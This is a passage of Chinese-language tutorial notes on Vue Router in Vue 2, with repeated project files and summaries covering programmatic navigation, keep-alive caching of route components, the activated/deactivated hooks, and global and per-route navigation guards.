import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

//创建并暴露一个路由器
export default new VueRouter({
    routes: [
        {
            name: 'guanyu',
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [
                {
                    path: 'news',
                    component: News
                },
                {
                    path: 'message',
                    component: Message,
                    children: [
                        {
                            name: 'xiangqing',
                            path: 'detail',
                            component: Detail,
                            // props的第一种写法，值为对象，该对象中所有key-value都会以props的形式传递给Detail组件
                            // props: {a:1,b:'hello'}
                            //props的第二种写法，值为布尔值，就会把该路由组件收到的所有params参数，以porps的形式传递给Details组件
                            // props: true
                            //第三种写法，值为函数
                            props($route) {
                                return {
                                    id: $route.query.id,
                                    title: $route.query.title,
                                    a: 1,
                                    b: 'hello'
                                }
                            }
                        }
                    ]
                }
            ]
        }
    ]
})
```

src\components\Banner.vue

```vue
<template>
  <div class="col-xs-offset-2 col-xs-8">
    <div class="page-header">
      <h2>Vue Router Demo</h2>
      <button @click="back">后退</button>
      <button @click="forward">前进</button>
      <button @click="go">测试一下go</button>
    </div>
  </div>
</template>

<script>
export default {
  name: "Banner",
  methods:{
    back(){
      this.$router.back();
    },
    forward(){
      this.$router.forward();
    },
    go(){
      this.$router.go(2);
    }
  }
};
</script>
```

src\pages\About.vue

```vue
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
  name: "About",
  beforeDestroy() {
    console.log('About组件即将被销毁了');
  },
  mounted(){
    console.log('Abount组件挂载完毕了',this);
    window.abountRoute = this.$route;
    window.abountRouter = this.$router;
  }
};
</script>

```

src\pages\Home.vue

```vue
<template>
  <div>
    <h2>我是Home的内容</h2>
    <div>
      <ul class="nav nav-tabs">
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/news"
            >News</router-link
          >
        </li>
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/message"
            >Message</router-link
          >
        </li>
      </ul>
      <router-view></router-view>
    </div>
  </div>
</template>

<script>
export default {
  name: "Home",
  beforeDestroy() {
    console.log("home组件即将被销毁了");
  },
  mounted() {
    console.log("Home组件挂载完毕了", this);
    window.homeRouter = this.$route;
    window.HomeRouter = this.$router;
  },
};
</script>

```

src\pages\Message.vue

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带param参数，to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}-1</router-link> &nbsp; &nbsp; -->
        <!-- 跳转并携带query参数，to的对象写法 -->
        <router-link
          :to="{
            //path: '/home/message/detail',
            name: 'xiangqing',
            query: {
              id: m.id,
              title: m.title,
            },
          }"
          >{{ m.title }}</router-link
        >
        <button @click="pushShow(m)">push查看</button>
        <button @click="replaceShow(m)">replace查看</button>
      </li>
    </ul>
    <hr />
    <router-view></router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data() {
    return {
      messageList: [
        { id: "001", title: "消息001" },
        { id: "002", title: "消息002" },
        { id: "003", title: "消息003" },
      ],
    };
  },
  methods: {
    pushShow(m) {
      this.$router
        .push({
          name: "xiangqing",
          query: {
            id: m.id,
            title: m.title,
          },
        })
        .catch((err) => {
          if (err.name !== "NavigationDuplicated") {
            throw err;
          }
          // 对于重复导航，可以选择忽略错误
        });
    },
    replaceShow(m) {
      this.$router
        .replace({
          name: "xiangqing",
          query: {
            id: m.id,
            title: m.title,
          },
        })
        .catch((err) => {
          if (err.name !== "NavigationDuplicated") {
            throw err;
          }
          // 对于重复导航，可以选择忽略错误
        });
    },
  },
};
</script>
```

src\pages\Detail.vue

```vue
<template>
  <ul>
    <!-- <li>消息编号： {{$route.params.id}}</li> -->
    <!-- <li>消息标题： {{$route.params.title}}</li> -->
    <li>消息编号： {{ id }}</li>
    <li>消息标题： {{ title }}</li>
    <li>其他参数： {{ a }},{{ b }}</li>
  </ul>
</template>

<script>
export default {
  name: "Detail",
  props: ["id", "title", "a", "b"],
  computed: {
    // id(){
    // 	return this.$route.query.id
    // },
    // title(){
    // 	return this.$route.query.title
    // },
  },
  mounted() {
     console.log('detail组件完毕',this.$route)
  },
};
</script>
```

src\pages\News.vue

```vue
<template>
  <ul>
    <li>news001</li>
    <li>news002</li>
    <li>news003</li>
  </ul>
</template>

<script>
export default {
  name: "News",
}
</script>
```



![image-20250215174833324](.\images\image-20250215174833324.png)



总结：编程式路由导航

1. 作用：不借助```<router-link> ```实现路由跳转，让路由跳转更加灵活

2. 具体编码：

   ```js
   //$router的两个API
   this.$router.push({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   
   this.$router.replace({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   this.$router.forward() //前进
   this.$router.back() //后退
   this.$router.go() //可前进也可后退
   ```



### 4.9 缓存路由组件

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入VueRouter
import VueRouter from 'vue-router'
//引入路由器
import router from './router'

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用插件
Vue.use(VueRouter)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	router: router
})
```

src\App.vue

```vue
<template>
  <div>
    <div class="row">
        <Banner />
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- Vue中借助router-link标签实现路由的切换  -->
          <router-link class="list-group-item" active-class="active" :to="{
            name: 'guanyu'
          }">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定组件呈现的位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Banner from './components/Banner'

export default {
  name: "App",
  components: {Banner}
};
</script>
```

src\router\index.js

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

//创建并暴露一个路由器
export default new VueRouter({
    routes: [
        {
            name: 'guanyu',
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [
                {
                    path: 'news',
                    component: News
                },
                {
                    path: 'message',
                    component: Message,
                    children: [
                        {
                            name: 'xiangqing',
                            path: 'detail',
                            component: Detail,
                            // props的第一种写法，值为对象，该对象中所有key-value都会以props的形式传递给Detail组件
                            // props: {a:1,b:'hello'}
                            //props的第二种写法，值为布尔值，就会把该路由组件收到的所有params参数，以porps的形式传递给Details组件
                            // props: true
                            //第三种写法，值为函数
                            props($route) {
                                return {
                                    id: $route.query.id,
                                    title: $route.query.title,
                                    a: 1,
                                    b: 'hello'
                                }
                            }
                        }
                    ]
                }
            ]
        }
    ]
})
```

src\components\Banner.vue

```vue
<template>
  <div class="col-xs-offset-2 col-xs-8">
    <div class="page-header">
      <h2>Vue Router Demo</h2>
      <button @click="back">后退</button>
      <button @click="forward">前进</button>
      <button @click="go">测试一下go</button>
    </div>
  </div>
</template>

<script>
export default {
  name: "Banner",
  methods:{
    back(){
      this.$router.back();
    },
    forward(){
      this.$router.forward();
    },
    go(){
      this.$router.go(2);
    }
  }
};
</script>
```

src\pages\About.vue

```vue
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
  name: "About",
  beforeDestroy() {
    console.log('About组件即将被销毁了');
  },
  mounted(){
    console.log('Abount组件挂载完毕了',this);
    window.abountRoute = this.$route;
    window.abountRouter = this.$router;
  }
};
</script>

```

src\pages\Home.vue

```vue
<template>
  <div>
    <h2>我是Home的内容</h2>
    <div>
      <ul class="nav nav-tabs">
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/news"
            >News</router-link
          >
        </li>
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/message"
            >Message</router-link
          >
        </li>
      </ul>
      <!-- 缓存多个路由组件 -->
			<!-- <keep-alive :include="['News','Message']"> -->
      <!-- 缓存一个路由组件 -->
      <keep-alive include="News">
      <router-view></router-view>
      </keep-alive>
    </div>
  </div>
</template>

<script>
export default {
  name: "Home",
  beforeDestroy() {
    console.log("home组件即将被销毁了");
  },
  mounted() {
    console.log("Home组件挂载完毕了", this);
    window.homeRouter = this.$route;
    window.HomeRouter = this.$router;
  },
};
</script>

```

src\pages\Message.vue

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带param参数，to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}-1</router-link> &nbsp; &nbsp; -->
        <!-- 跳转并携带query参数，to的对象写法 -->
        <router-link
          :to="{
            //path: '/home/message/detail',
            name: 'xiangqing',
            query: {
              id: m.id,
              title: m.title,
            },
          }"
          >{{ m.title }}</router-link
        >
        <button @click="pushShow(m)">push查看</button>
        <button @click="replaceShow(m)">replace查看</button>
      </li>
    </ul>
    <hr />
    <router-view></router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data() {
    return {
      messageList: [
        { id: "001", title: "消息001" },
        { id: "002", title: "消息002" },
        { id: "003", title: "消息003" },
      ],
    };
  },
  methods: {
    pushShow(m) {
      this.$router
        .push({
          name: "xiangqing",
          query: {
            id: m.id,
            title: m.title,
          },
        })
        .catch((err) => {
          if (err.name !== "NavigationDuplicated") {
            throw err;
          }
          // 对于重复导航，可以选择忽略错误
        });
    },
    replaceShow(m) {
      this.$router
        .replace({
          name: "xiangqing",
          query: {
            id: m.id,
            title: m.title,
          },
        })
        .catch((err) => {
          if (err.name !== "NavigationDuplicated") {
            throw err;
          }
          // 对于重复导航，可以选择忽略错误
        });
    },
  },
};
</script>
```

src\pages\Detail.vue

```vue
<template>
  <ul>
    <!-- <li>消息编号： {{$route.params.id}}</li> -->
    <!-- <li>消息标题： {{$route.params.title}}</li> -->
    <li>消息编号： {{ id }}</li>
    <li>消息标题： {{ title }}</li>
    <li>其他参数： {{ a }},{{ b }}</li>
  </ul>
</template>

<script>
export default {
  name: "Detail",
  props: ["id", "title", "a", "b"],
  computed: {
    // id(){
    // 	return this.$route.query.id
    // },
    // title(){
    // 	return this.$route.query.title
    // },
  },
  mounted() {
     console.log('detail组件完毕',this.$route)
  },
};
</script>
```

src\pages\News.vue

```vue
<template>
  <ul>
    <li>news001 <input type="text" /></li>
    <li>news002 <input type="text" /></li>
    <li>news003 <input type="text" /></li>
  </ul>
</template>

<script>
export default {
  name: "News",
  beforeDestroy(){
    console.log('News组件即将被销毁了');
  }
}
</script>

```

组件

![image-20250215180554316](.\images\image-20250215180554316.png)

总结：缓存路由组件

1. 作用：让不展示的路由组件保持挂载，不被销毁。

2. 具体编码：

   ```vue
   <keep-alive include="News"> 
       <router-view></router-view>
   </keep-alive>
   ```

### 4.10 两个新生命周期沟子

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入VueRouter
import VueRouter from 'vue-router'
//引入路由器
import router from './router'

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用插件
Vue.use(VueRouter)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	router: router
})
```

src\App.vue

```vue
<template>
  <div>
    <div class="row">
        <Banner />
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- Vue中借助router-link标签实现路由的切换  -->
          <router-link class="list-group-item" active-class="active" :to="{
            name: 'guanyu'
          }">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定组件呈现的位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Banner from './components/Banner'

export default {
  name: "App",
  components: {Banner}
};
</script>
```

src\router\index.js

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

//创建并暴露一个路由器
export default new VueRouter({
    routes: [
        {
            name: 'guanyu',
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [
                {
                    path: 'news',
                    component: News
                },
                {
                    path: 'message',
                    component: Message,
                    children: [
                        {
                            name: 'xiangqing',
                            path: 'detail',
                            component: Detail,
                            // props的第一种写法，值为对象，该对象中所有key-value都会以props的形式传递给Detail组件
                            // props: {a:1,b:'hello'}
                            //props的第二种写法，值为布尔值，就会把该路由组件收到的所有params参数，以porps的形式传递给Details组件
                            // props: true
                            //第三种写法，值为函数
                            props($route) {
                                return {
                                    id: $route.query.id,
                                    title: $route.query.title,
                                    a: 1,
                                    b: 'hello'
                                }
                            }
                        }
                    ]
                }
            ]
        }
    ]
})
```

src\components\Banner.vue

```vue
<template>
  <div class="col-xs-offset-2 col-xs-8">
    <div class="page-header">
      <h2>Vue Router Demo</h2>
      <button @click="back">后退</button>
      <button @click="forward">前进</button>
      <button @click="go">测试一下go</button>
    </div>
  </div>
</template>

<script>
export default {
  name: "Banner",
  methods:{
    back(){
      this.$router.back();
    },
    forward(){
      this.$router.forward();
    },
    go(){
      this.$router.go(2);
    }
  }
};
</script>
```

src\pages\About.vue

```vue
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
  name: "About",
  beforeDestroy() {
    console.log('About组件即将被销毁了');
  },
  mounted(){
    console.log('Abount组件挂载完毕了',this);
    window.abountRoute = this.$route;
    window.abountRouter = this.$router;
  }
};
</script>

```

src\pages\Home.vue

```vue
<template>
  <div>
    <h2>我是Home的内容</h2>
    <div>
      <ul class="nav nav-tabs">
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/news"
            >News</router-link
          >
        </li>
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/message"
            >Message</router-link
          >
        </li>
      </ul>
      <!-- 缓存多个路由组件 -->
			<!-- <keep-alive :include="['News','Message']"> -->
      <!-- 缓存一个路由组件 -->
      <keep-alive include="News">
      <router-view></router-view>
      </keep-alive>
    </div>
  </div>
</template>

<script>
export default {
  name: "Home",
  beforeDestroy() {
    console.log("home组件即将被销毁了");
  },
  mounted() {
    console.log("Home组件挂载完毕了", this);
    window.homeRouter = this.$route;
    window.HomeRouter = this.$router;
  },
};
</script>

```

src\pages\Message.vue

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带param参数，to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}-1</router-link> &nbsp; &nbsp; -->
        <!-- 跳转并携带query参数，to的对象写法 -->
        <router-link
          :to="{
            //path: '/home/message/detail',
            name: 'xiangqing',
            query: {
              id: m.id,
              title: m.title,
            },
          }"
          >{{ m.title }}</router-link
        >
        <button @click="pushShow(m)">push查看</button>
        <button @click="replaceShow(m)">replace查看</button>
      </li>
    </ul>
    <hr />
    <router-view></router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data() {
    return {
      messageList: [
        { id: "001", title: "消息001" },
        { id: "002", title: "消息002" },
        { id: "003", title: "消息003" },
      ],
    };
  },
  methods: {
    pushShow(m) {
      this.$router
        .push({
          name: "xiangqing",
          query: {
            id: m.id,
            title: m.title,
          },
        })
        .catch((err) => {
          if (err.name !== "NavigationDuplicated") {
            throw err;
          }
          // 对于重复导航，可以选择忽略错误
        });
    },
    replaceShow(m) {
      this.$router
        .replace({
          name: "xiangqing",
          query: {
            id: m.id,
            title: m.title,
          },
        })
        .catch((err) => {
          if (err.name !== "NavigationDuplicated") {
            throw err;
          }
          // 对于重复导航，可以选择忽略错误
        });
    },
  },
};
</script>
```

src\pages\Detail.vue

```vue
<template>
  <ul>
    <!-- <li>消息编号： {{$route.params.id}}</li> -->
    <!-- <li>消息标题： {{$route.params.title}}</li> -->
    <li>消息编号： {{ id }}</li>
    <li>消息标题： {{ title }}</li>
    <li>其他参数： {{ a }},{{ b }}</li>
  </ul>
</template>

<script>
export default {
  name: "Detail",
  props: ["id", "title", "a", "b"],
  computed: {
    // id(){
    // 	return this.$route.query.id
    // },
    // title(){
    // 	return this.$route.query.title
    // },
  },
  mounted() {
     console.log('detail组件完毕',this.$route)
  },
};
</script>
```

src\pages\News.vue

```vue
<template>
  <ul>
    <li :style="{ opacity }">欢迎学习Vue</li>
    <li>news001 <input type="text" /></li>
    <li>news002 <input type="text" /></li>
    <li>news003 <input type="text" /></li>
  </ul>
</template>

<script>
export default {
  name: "News",
  data() {
    return {
      opacity: 1,
    };
  },
  /* beforeDestroy(){
    //由于存在组件缓存的关系，导致此在组件被切换时，不能被停止，定时器一直在执行，造成浪费。
    console.log('News组件即将被销毁了');
    clearInterval(this.timer);
  },
  mounted(){
    this.timer = setInterval(()=>{
      console.log('@');
      this.opacity -= 0.01;
      if(this.opacity <= 0){
        this.opacity = 1;
      }
    });
  } */

  //组件被激活时
  activated() {
    this.timer = setInterval(() => {
      console.log("@");
      this.opacity -= 0.01;
      if (this.opacity <= 0) {
        this.opacity = 1;
      }
    });
  },
  //组件被切换时，或者失活时
  deactivated() {
    console.log("News组件失活了");
    clearInterval(this.timer);
  },
};
</script>

```

运行

![image-20250215182404253](.\images\image-20250215182404253.png)

总结：两个新的生命周期钩子

1. 作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
2. 具体名字：
   1. ```activated```路由组件被激活时触发。
   2. ```deactivated```路由组件失活时触发。



### 4.11 全局路由守卫

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入VueRouter
import VueRouter from 'vue-router'
//引入路由器
import router from './router'

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用插件
Vue.use(VueRouter)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	router: router
})
```

src\App.vue

```vue
<template>
  <div>
    <div class="row">
        <Banner />
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- Vue中借助router-link标签实现路由的切换  -->
          <router-link class="list-group-item" active-class="active" :to="{
            name: 'guanyu'
          }">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定组件呈现的位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Banner from './components/Banner'

export default {
  name: "App",
  components: {Banner}
};
</script>
```

src\router\index.js

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

//创建并暴露一个路由器
const router =  new VueRouter({
    routes: [
        {
            name: 'guanyu',
            path: '/about',
            component: About,
            meta: { title: '关于' }
        },
        {
            path: '/home',
            component: Home,
            meta: { title: '主页' },
            children: [
                {
                    path: 'news',
                    component: News,
                    meta: { title: '主页' },
                },
                {
                    path: 'message',
                    component: Message,
                    meta: { isAuth: true, title: '新闻' },
                    children: [
                        {
                            name: 'xiangqing',
                            path: 'detail',
                            component: Detail,
                            meta: { isAuth: true, title: '详情' },
                            // props的第一种写法，值为对象，该对象中所有key-value都会以props的形式传递给Detail组件
                            // props: {a:1,b:'hello'}
                            //props的第二种写法，值为布尔值，就会把该路由组件收到的所有params参数，以porps的形式传递给Details组件
                            // props: true
                            //第三种写法，值为函数
                            props($route) {
                                return {
                                    id: $route.query.id,
                                    title: $route.query.title,
                                    a: 1,
                                    b: 'hello'
                                }
                            }
                        }
                    ]
                }
            ]
        }
    ]
})

//全局前轩路由守卫——初始化的时候被调用、每次路由切换之前被调用。
router.beforeEach((to, from, next) => {
    console.log('前置路由守卫', to, from);
    //判断是否需要鉴权
    if(to.meta.isAuth){
        console.log('学校名称',localStorage.getItem('school'))
        if(localStorage.getItem('school') === 'test' )
        {
            next();
        }
        else{
            alert('学校名称不对，无权查看')
        }
    }
    else{
        next();
    }
})


//全局后置路由守卫——初始化的时候调用、每次路由切换完成后调用。
router.afterEach((to,from)=>{
    console.log('后置路由守卫',to,from);
    document.title = to.meta.title || '系统'
})


export default router
```

src\components\Banner.vue

```vue
<template>
  <div class="col-xs-offset-2 col-xs-8">
    <div class="page-header">
      <h2>Vue Router Demo</h2>
      <button @click="back">后退</button>
      <button @click="forward">前进</button>
      <button @click="go">测试一下go</button>
    </div>
  </div>
</template>

<script>
export default {
  name: "Banner",
  methods:{
    back(){
      this.$router.back();
    },
    forward(){
      this.$router.forward();
    },
    go(){
      this.$router.go(2);
    }
  }
};
</script>
```

src\pages\About.vue

```vue
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
  name: "About",
  beforeDestroy() {
    console.log('About组件即将被销毁了');
  },
  mounted(){
    console.log('Abount组件挂载完毕了',this);
    window.abountRoute = this.$route;
    window.abountRouter = this.$router;
  }
};
</script>

```

src\pages\Home.vue

```vue
<template>
  <div>
    <h2>我是Home的内容</h2>
    <div>
      <ul class="nav nav-tabs">
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/news"
            >News</router-link
          >
        </li>
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/message"
            >Message</router-link
          >
        </li>
      </ul>
      <!-- 缓存多个路由组件 -->
			<!-- <keep-alive :include="['News','Message']"> -->
      <!-- 缓存一个路由组件 -->
      <keep-alive include="News">
      <router-view></router-view>
      </keep-alive>
    </div>
  </div>
</template>

<script>
export default {
  name: "Home",
  beforeDestroy() {
    console.log("home组件即将被销毁了");
  },
  mounted() {
    console.log("Home组件挂载完毕了", this);
    window.homeRouter = this.$route;
    window.HomeRouter = this.$router;
  },
};
</script>

```

src\pages\Message.vue

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带param参数，to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}-1</router-link> &nbsp; &nbsp; -->
        <!-- 跳转并携带query参数，to的对象写法 -->
        <router-link
          :to="{
            //path: '/home/message/detail',
            name: 'xiangqing',
            query: {
              id: m.id,
              title: m.title,
            },
          }"
          >{{ m.title }}</router-link
        >
        <button @click="pushShow(m)">push查看</button>
        <button @click="replaceShow(m)">replace查看</button>
      </li>
    </ul>
    <hr />
    <router-view></router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data() {
    return {
      messageList: [
        { id: "001", title: "消息001" },
        { id: "002", title: "消息002" },
        { id: "003", title: "消息003" },
      ],
    };
  },
  methods: {
    pushShow(m) {
      this.$router
        .push({
          name: "xiangqing",
          query: {
            id: m.id,
            title: m.title,
          },
        })
        .catch((err) => {
          if (err.name !== "NavigationDuplicated") {
            throw err;
          }
          // 对于重复导航，可以选择忽略错误
        });
    },
    replaceShow(m) {
      this.$router
        .replace({
          name: "xiangqing",
          query: {
            id: m.id,
            title: m.title,
          },
        })
        .catch((err) => {
          if (err.name !== "NavigationDuplicated") {
            throw err;
          }
          // 对于重复导航，可以选择忽略错误
        });
    },
  },
};
</script>
```

src\pages\Detail.vue

```vue
<template>
  <ul>
    <!-- <li>消息编号： {{$route.params.id}}</li> -->
    <!-- <li>消息标题： {{$route.params.title}}</li> -->
    <li>消息编号： {{ id }}</li>
    <li>消息标题： {{ title }}</li>
    <li>其他参数： {{ a }},{{ b }}</li>
  </ul>
</template>

<script>
export default {
  name: "Detail",
  props: ["id", "title", "a", "b"],
  computed: {
    // id(){
    // 	return this.$route.query.id
    // },
    // title(){
    // 	return this.$route.query.title
    // },
  },
  mounted() {
     console.log('detail组件完毕',this.$route)
  },
};
</script>
```

src\pages\News.vue

```vue
<template>
  <ul>
    <li :style="{ opacity }">欢迎学习Vue</li>
    <li>news001 <input type="text" /></li>
    <li>news002 <input type="text" /></li>
    <li>news003 <input type="text" /></li>
  </ul>
</template>

<script>
export default {
  name: "News",
  data() {
    return {
      opacity: 1,
    };
  },
  /* beforeDestroy(){
    //由于存在组件缓存的关系，导致此在组件被切换时，不能被停止，定时器一直在执行，造成浪费。
    console.log('News组件即将被销毁了');
    clearInterval(this.timer);
  },
  mounted(){
    this.timer = setInterval(()=>{
      console.log('@');
      this.opacity -= 0.01;
      if(this.opacity <= 0){
        this.opacity = 1;
      }
    });
  } */

  //组件被激活时
  activated() {
    this.timer = setInterval(() => {
      console.log("@");
      this.opacity -= 0.01;
      if (this.opacity <= 0) {
        this.opacity = 1;
      }
    });
  },
  //组件被切换时，或者失活时
  deactivated() {
    console.log("News组件失活了");
    clearInterval(this.timer);
  },
};
</script>

```

运行

![image-20250216150722949](.\images\image-20250216150722949.png)

![image-20250216150842225](.\images\image-20250216150842225.png)

总结：

1. 作用：对路由进行权限控制

2. 分类：全局守卫、独享守卫、组件内守卫

3. 全局守卫:

   ```js
   //全局前置守卫：初始化时执行、每次路由切换前执行
   router.beforeEach((to,from,next)=>{
   	consolwte.log('beforeEach',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'atguigu'){ //权限控制的具体规则
   			next() //放行
   		}else{
   			alert('暂无权限查看')
   			// next({name:'guanyu'})
   		}
   	}else{
   		next() //放行
   	}
   })
   
   //全局后置守卫：初始化时执行、每次路由切换后执行
   router.afterEach((to,from)=>{
   	console.log('afterEach',to,from)
   	if(to.meta.title){ 
   		document.title = to.meta.title //修改网页的title
   	}else{
   		document.title = 'vue_test'
   	}
   })
   ```



### 4.12 独享路由守卫

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入VueRouter
import VueRouter from 'vue-router'
//引入路由器
import router from './router'

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用插件
Vue.use(VueRouter)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	router: router
})
```

src\App.vue

```vue
<template>
  <div>
    <div class="row">
        <Banner />
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- Vue中借助router-link标签实现路由的切换  -->
          <router-link class="list-group-item" active-class="active" :to="{
            name: 'guanyu'
          }">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定组件呈现的位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Banner from './components/Banner'

export default {
  name: "App",
  components: {Banner}
};
</script>
```

src\router\index.js

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

//创建并暴露一个路由器
const router =  new VueRouter({
    routes: [
        {
            name: 'guanyu',
            path: '/about',
            component: About,
            meta: { title: '关于' }
        },
        {
            path: '/home',
            component: Home,
            meta: { title: '主页' },
            children: [
                {
                    path: 'news',
                    component: News,
                    meta: { isAuth: true,title: '新闻' },
                    beforeEnter: (to,from,next) =>{
                        console.log('独享路由宝卫',to,from)
                        //仅对新闻判断是否需要鉴权
                        if(to.meta.isAuth){
                            if(localStorage.getItem('school') === 'test')
                            {
                                next();
                            }
                            else{
                                alert('学校名称不对，无权查看');
                            }
                        }
                        else{
                            next();
                        }
                    }
                },
                {
                    path: 'message',
                    component: Message,
                    meta: { isAuth: true, title: '消息' },
                    children: [
                        {
                            name: 'xiangqing',
                            path: 'detail',
                            component: Detail,
                            meta: { isAuth: true, title: '详情' },
                            // props的第一种写法，值为对象，该对象中所有key-value都会以props的形式传递给Detail组件
                            // props: {a:1,b:'hello'}
                            //props的第二种写法，值为布尔值，就会把该路由组件收到的所有params参数，以porps的形式传递给Details组件
                            // props: true
                            //第三种写法，值为函数
                            props($route) {
                                return {
                                    id: $route.query.id,
                                    title: $route.query.title,
                                    a: 1,
                                    b: 'hello'
                                }
                            }
                        }
                    ]
                }
            ]
        }
    ]
})

// //全局前轩路由守卫——初始化的时候被调用、每次路由切换之前被调用。
// router.beforeEach((to, from, next) => {
//     console.log('前置路由守卫', to, from);
//     //判断是否需要鉴权
//     if(to.meta.isAuth){
//         console.log('学校名称',localStorage.getItem('school'))
//         if(localStorage.getItem('school') === 'test' )
//         {
//             next();
//         }
//         else{
//             alert('学校名称不对，无权查看')
//         }
//     }
//     else{
//         next();
//     }
// })


//全局后置路由守卫——初始化的时候调用、每次路由切换完成后调用。
router.afterEach((to,from)=>{
    console.log('后置路由守卫',to,from);
    document.title = to.meta.title || '系统'
})


export default router
```

src\components\Banner.vue

```vue
<template>
  <div class="col-xs-offset-2 col-xs-8">
    <div class="page-header">
      <h2>Vue Router Demo</h2>
      <button @click="back">后退</button>
      <button @click="forward">前进</button>
      <button @click="go">测试一下go</button>
    </div>
  </div>
</template>

<script>
export default {
  name: "Banner",
  methods:{
    back(){
      this.$router.back();
    },
    forward(){
      this.$router.forward();
    },
    go(){
      this.$router.go(2);
    }
  }
};
</script>
```

src\pages\About.vue

```vue
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
  name: "About",
  beforeDestroy() {
    console.log('About组件即将被销毁了');
  },
  mounted(){
    console.log('Abount组件挂载完毕了',this);
    window.abountRoute = this.$route;
    window.abountRouter = this.$router;
  }
};
</script>

```

src\pages\Home.vue

```vue
<template>
  <div>
    <h2>我是Home的内容</h2>
    <div>
      <ul class="nav nav-tabs">
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/news"
            >News</router-link
          >
        </li>
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/message"
            >Message</router-link
          >
        </li>
      </ul>
      <!-- 缓存多个路由组件 -->
			<!-- <keep-alive :include="['News','Message']"> -->
      <!-- 缓存一个路由组件 -->
